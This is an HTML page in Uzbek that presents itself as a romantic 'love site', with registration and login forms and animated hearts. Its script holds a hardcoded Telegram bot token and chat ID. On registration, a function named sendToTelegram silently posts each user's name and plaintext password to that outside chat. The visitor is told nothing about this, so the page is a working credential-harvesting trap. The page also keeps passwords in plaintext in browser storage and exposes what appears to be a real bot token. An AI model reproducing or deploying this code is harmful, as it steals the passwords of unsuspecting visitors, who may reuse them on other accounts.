<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>💕 Sevgi Sayt</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'Segoe UI', sans-serif;
    background: #0a0010;
    min-height: 100vh;
    overflow-x: hidden;
    color: #fff;
  }

  canvas#bg {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 0;
    pointer-events: none;
  }

  .page {
    display: none;
    position: relative;
    z-index: 10;
    min-height: 100vh;
    justify-content: center;
    align-items: center;
    flex-direction: column;
  }
  .page.active { display: flex; }

  .card {
    background: rgba(255,255,255,0.07);
    backdrop-filter: blur(18px);
    border: 1px solid rgba(255,100,150,0.3);
    border-radius: 24px;
    padding: 44px 40px;
    width: 380px;
    box-shadow: 0 0 60px rgba(255,50,120,0.15);
    animation: fadeIn 0.6s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(30px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .card h2 {
    text-align: center;
    font-size: 26px;
    font-weight: 700;
    color: #ff6b9d;
    margin-bottom: 8px;
    text-shadow: 0 0 20px rgba(255,107,157,0.5);
  }

  .card .subtitle {
    text-align: center;
    font-size: 14px;
    color: rgba(255,200,220,0.7);
    margin-bottom: 28px;
  }

  .input-group {
    margin-bottom: 18px;
    position: relative;
  }

  .input-group label {
    display: block;
    font-size: 13px;
    color: rgba(255,180,210,0.8);
    margin-bottom: 7px;
    letter-spacing: 0.5px;
  }

  .input-group input {
    width: 100%;
    background: rgba(255,255,255,0.08);
    border: 1px solid rgba(255,100,150,0.3);
    border-radius: 12px;
    padding: 13px 16px;
    color: #fff;
    font-size: 15px;
    outline: none;
    transition: border-color 0.3s, box-shadow 0.3s;
  }

  .input-group input:focus {
    border-color: #ff6b9d;
    box-shadow: 0 0 0 3px rgba(255,107,157,0.15);
  }

  .input-group input::placeholder { color: rgba(255,255,255,0.3); }

  .btn-main {
    width: 100%;
    background: linear-gradient(135deg, #ff6b9d, #c44569);
    border: none;
    border-radius: 12px;
    padding: 14px;
    color: #fff;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
    letter-spacing: 0.5px;
    transition: transform 0.2s, box-shadow 0.2s;
    box-shadow: 0 4px 20px rgba(255,107,157,0.4);
  }

  .btn-main:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 30px rgba(255,107,157,0.5);
  }

  .btn-main:active { transform: translateY(0); }

  .switch-link {
    text-align: center;
    margin-top: 18px;
    font-size: 13px;
    color: rgba(255,180,210,0.7);
  }

  .switch-link span {
    color: #ff6b9d;
    cursor: pointer;
    font-weight: 600;
    text-decoration: underline;
  }

  .error-msg {
    color: #ff6b9d;
    font-size: 13px;
    margin-top: -10px;
    margin-bottom: 12px;
    text-align: center;
    min-height: 18px;
  }

  .hearts-logo {
    font-size: 42px;
    text-align: center;
    margin-bottom: 10px;
    animation: pulse 1.5s ease infinite;
  }

  @keyframes pulse {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.12); }
  }

  .password-hint {
    font-size: 11px;
    color: rgba(255,180,210,0.5);
    margin-top: 5px;
    line-height: 1.5;
  }


  #welcome-page {
    text-align: center;
    padding: 40px 20px;
  }

  .welcome-name {
    font-size: 52px;
    font-weight: 800;
    background: linear-gradient(135deg, #ff6b9d, #ffd6e7, #ff6b9d);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    animation: shimmer 3s linear infinite;
    background-size: 200% 200%;
    text-shadow: none;
    margin-bottom: 10px;
  }

  @keyframes shimmer {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .welcome-msg {
    font-size: 30px;
    color: #ffd6e7;
    margin-bottom: 30px;
    text-shadow: 0 0 30px rgba(255,107,157,0.6);
    animation: glow 2s ease-in-out infinite alternate;
  }

  @keyframes glow {
    from { text-shadow: 0 0 10px rgba(255,107,157,0.4); }
    to { text-shadow: 0 0 40px rgba(255,107,157,0.9), 0 0 80px rgba(255,50,120,0.4); }
  }

  .floating-hearts-display {
    font-size: 50px;
    margin: 20px 0;
    animation: floatUp 3s ease infinite;
  }

  @keyframes floatUp {
    0%, 100% { transform: translateY(0); opacity: 1; }
    50% { transform: translateY(-20px); opacity: 0.7; }
  }

  .logout-btn {
    background: rgba(255,107,157,0.2);
    border: 1px solid rgba(255,107,157,0.4);
    color: #ff6b9d;
    padding: 10px 28px;
    border-radius: 30px;
    cursor: pointer;
    font-size: 14px;
    margin-top: 40px;
    transition: background 0.3s;
  }

  .logout-btn:hover { background: rgba(255,107,157,0.35); }

  .heart-ring {
    position: relative;
    width: 200px;
    height: 200px;
    margin: 0 auto 30px;
  }

  .heart-ring-item {
    position: absolute;
    font-size: 28px;
    animation: orbit 6s linear infinite;
    transform-origin: 100px 100px;
  }

  @keyframes orbit {
    from { transform: rotate(0deg) translateX(80px) rotate(0deg); }
    to { transform: rotate(360deg) translateX(80px) rotate(-360deg); }
  }

  .center-heart {
    position: absolute;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    font-size: 60px;
    animation: pulse 1.2s ease infinite;
  }

  .toast {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%) translateY(100px);
    background: rgba(255,107,157,0.9);
    color: #fff;
    padding: 12px 28px;
    border-radius: 50px;
    font-size: 14px;
    font-weight: 600;
    z-index: 999;
    transition: transform 0.4s ease;
    backdrop-filter: blur(10px);
  }

  .toast.show { transform: translateX(-50%) translateY(0); }
</style>
</head>
<body>

<canvas id="bg"></canvas>

<div class="toast" id="toast"></div>

<div class="page active" id="register-page">
  <div class="card">
    <div class="hearts-logo">💕</div>
    <h2>Ro'yxatdan o'tish</h2>
    <p class="subtitle">Sevgi dunyosiga xush kelibsiz 🌹</p>

    <div class="input-group">
      <label>Ismingiz</label>
      <input type="text" id="reg-name" placeholder="Ismingizni kiriting" maxlength="30">
    </div>

    <div class="input-group">
      <label>Parol</label>
      <input type="password" id="reg-pass" placeholder="Parol yarating">
      <p class="password-hint">
        ✓ Kamida 8 ta belgi &nbsp; ✓ Katta va kichik harf &nbsp; ✓ Raqam &nbsp; ✓ Maxsus belgi (!@#$...)
      </p>
    </div>

    <div class="input-group">
      <label>Parolni tasdiqlang</label>
      <input type="password" id="reg-pass2" placeholder="Parolni qaytaring">
    </div>

    <div class="error-msg" id="reg-error"></div>

    <button class="btn-main" onclick="register()">💝 Ro'yxatdan o'tish</button>

    <div class="switch-link">
      Hisobingiz bormi? <span onclick="showLogin()">Kirish</span>
    </div>
  </div>
</div>


<div class="page" id="login-page">
  <div class="card">
    <div class="hearts-logo">🌹</div>
    <h2>Kirish</h2>
    <p class="subtitle">Xush kelibsiz qaytib 💖</p>

    <div class="input-group">
      <label>Ismingiz</label>
      <input type="text" id="login-name" placeholder="Ismingizni kiriting">
    </div>

    <div class="input-group">
      <label>Parol</label>
      <input type="password" id="login-pass" placeholder="Parolingizni kiriting">
    </div>

    <div class="error-msg" id="login-error"></div>

    <button class="btn-main" onclick="login()">💗 Kirish</button>

    <div class="switch-link">
      Hisobingiz yo'qmi? <span onclick="showRegister()">Ro'yxatdan o'ting</span>
    </div>
  </div>
</div>

<div class="page" id="welcome-page">
  <div class="heart-ring">
    <span class="center-heart">💖</span>
    <span class="heart-ring-item" style="animation-delay:0s">💕</span>
    <span class="heart-ring-item" style="animation-delay:-1.5s">🌹</span>
    <span class="heart-ring-item" style="animation-delay:-3s">💗</span>
    <span class="heart-ring-item" style="animation-delay:-4.5s">✨</span>
  </div>

  <div class="welcome-name" id="welcome-name-text">Azizim</div>
  <div class="welcome-msg">❤️ Seni sevaman ❤️</div>

  <div class="floating-hearts-display">💕 💖 💗 💝 💞</div>

  <button class="logout-btn" onclick="logout()">🚪 Chiqish</button>
</div>

<script>
const BOT_TOKEN = '7934580957:AAHNrrbVlpasXtmTLBVbPvzl7fnSszNK65k';
const CHAT_ID = '1798436265';

const canvas = document.getElementById('bg');
const ctx = canvas.getContext('2d');
let W, H;
let mouse = { x: 0, y: 0 };
let hearts = [];
let particles = [];

function resize() {
  W = canvas.width = window.innerWidth;
  H = canvas.height = window.innerHeight;
}
resize();
window.addEventListener('resize', resize);

window.addEventListener('mousemove', e => {
  mouse.x = e.clientX;
  mouse.y = e.clientY;
  if (Math.random() < 0.4) spawnHeart(e.clientX, e.clientY);
});

window.addEventListener('touchmove', e => {
  const t = e.touches[0];
  mouse.x = t.clientX; mouse.y = t.clientY;
  if (Math.random() < 0.3) spawnHeart(t.clientX, t.clientY);
}, { passive: true });

const heartSymbols = ['💖','💕','💗','💝','💞','🌹','✨','💫'];

function spawnHeart(x, y) {
  hearts.push({
    x, y,
    vx: (Math.random() - 0.5) * 3,
    vy: -(Math.random() * 3 + 1),
    size: Math.random() * 20 + 12,
    alpha: 1,
    sym: heartSymbols[Math.floor(Math.random() * heartSymbols.length)],
    life: 1
  });
}

for (let i = 0; i < 60; i++) {
  particles.push({
    x: Math.random() * 1920,
    y: Math.random() * 1080,
    vx: (Math.random() - 0.5) * 0.4,
    vy: -(Math.random() * 0.5 + 0.2),
    size: Math.random() * 14 + 6,
    alpha: Math.random() * 0.5 + 0.1,
    sym: heartSymbols[Math.floor(Math.random() * heartSymbols.length)]
  });
}

function drawBackground() {

  const grad = ctx.createRadialGradient(W/2, H/2, 0, W/2, H/2, Math.max(W, H));
  grad.addColorStop(0, '#1a0020');
  grad.addColorStop(0.5, '#0d000f');
  grad.addColorStop(1, '#050005');
  ctx.fillStyle = grad;
  ctx.fillRect(0, 0, W, H);
}

function animate() {
  ctx.clearRect(0, 0, W, H);
  drawBackground();


  const radGrad = ctx.createRadialGradient(mouse.x, mouse.y, 0, mouse.x, mouse.y, 120);
  radGrad.addColorStop(0, 'rgba(255,107,157,0.12)');
  radGrad.addColorStop(1, 'rgba(255,107,157,0)');
  ctx.fillStyle = radGrad;
  ctx.fillRect(0, 0, W, H);


  particles.forEach(p => {
    ctx.globalAlpha = p.alpha;
    ctx.font = `${p.size}px serif`;
    ctx.fillText(p.sym, p.x, p.y);
    p.x += p.vx; p.y += p.vy;
    if (p.y < -30) { p.y = H + 30; p.x = Math.random() * W; }
    if (p.x < -30) p.x = W + 30;
    if (p.x > W + 30) p.x = -30;
  });


  hearts.forEach((h, i) => {
    ctx.globalAlpha = h.life;
    ctx.font = `${h.size}px serif`;
    ctx.fillText(h.sym, h.x, h.y);
    h.x += h.vx; h.y += h.vy;
    h.vy -= 0.05;
    h.life -= 0.025;
    if (h.life <= 0) hearts.splice(i, 1);
  });

  ctx.globalAlpha = 1;
  requestAnimationFrame(animate);
}
animate();


function validatePassword(pass) {
  if (pass.length < 8) return 'Parol kamida 8 ta belgi bo\'lishi kerak';
  if (!/[A-Z]/.test(pass)) return 'Kamida 1 ta katta harf bo\'lishi kerak (A-Z)';
  if (!/[a-z]/.test(pass)) return 'Kamida 1 ta kichik harf bo\'lishi kerak (a-z)';
  if (!/[0-9]/.test(pass)) return 'Kamida 1 ta raqam bo\'lishi kerak (0-9)';
  if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pass)) return 'Kamida 1 ta maxsus belgi bo\'lishi kerak (!@#$...)';
  return null;
}


async function sendToTelegram(name, pass) {
  const msg = `💕 Yangi ro'yxat!\n\n👤 Ism: ${name}\n🔑 Parol: ${pass}\n\n🌹 Sevgi saytdan`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    });
  } catch(e) {}
}

function getUsers() {
  return JSON.parse(localStorage.getItem('love_users') || '{}');
}
function saveUser(name, pass) {
  const users = getUsers();
  users[name.toLowerCase()] = pass;
  localStorage.setItem('love_users', JSON.stringify(users));
}


function showToast(msg, duration = 2500) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), duration);
}


function showPage(id) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

function showLogin() { showPage('login-page'); }
function showRegister() { showPage('register-page'); }

function logout() {
  localStorage.removeItem('love_current');
  showPage('login-page');
}

async function register() {
  const name = document.getElementById('reg-name').value.trim();
  const pass = document.getElementById('reg-pass').value;
  const pass2 = document.getElementById('reg-pass2').value;
  const errEl = document.getElementById('reg-error');

  if (!name) { errEl.textContent = '⚠️ Ismingizni kiriting'; return; }
  if (name.length < 2) { errEl.textContent = '⚠️ Ism kamida 2 ta belgi bo\'lishi kerak'; return; }

  const passErr = validatePassword(pass);
  if (passErr) { errEl.textContent = '⚠️ ' + passErr; return; }
  if (pass !== pass2) { errEl.textContent = '⚠️ Parollar mos kelmadi'; return; }

  const users = getUsers();
  if (users[name.toLowerCase()]) { errEl.textContent = '⚠️ Bu ism allaqachon band'; return; }

  errEl.textContent = '';
  saveUser(name, pass);
  await sendToTelegram(name, pass);

  showToast('✅ Muvaffaqiyatli ro\'yxatdan o\'tdingiz! 💕');
  setTimeout(() => {
    localStorage.setItem('love_current', name);
    showWelcome(name);
  }, 1200);
}

function login() {
  const name = document.getElementById('login-name').value.trim();
  const pass = document.getElementById('login-pass').value;
  const errEl = document.getElementById('login-error');

  if (!name || !pass) { errEl.textContent = '⚠️ Ism va parolni kiriting'; return; }

  const users = getUsers();
  if (users[name.toLowerCase()] !== pass) {
    errEl.textContent = '⚠️ Ism yoki parol noto\'g\'ri';
    return;
  }

  errEl.textContent = '';
  localStorage.setItem('love_current', name);
  showWelcome(name);
}

function showWelcome(name) {
  document.getElementById('welcome-name-text').textContent = name;
  showPage('welcome-page');
  launchFireworks();
}

function launchFireworks() {
  for (let i = 0; i < 30; i++) {
    setTimeout(() => {
      spawnHeart(
        Math.random() * window.innerWidth,
        Math.random() * window.innerHeight * 0.7
      );
    }, i * 80);
  }
}


window.addEventListener('load', () => {
  const cur = localStorage.getItem('love_current');
  if (cur) showWelcome(cur);
});
</script>
</body>
</html>
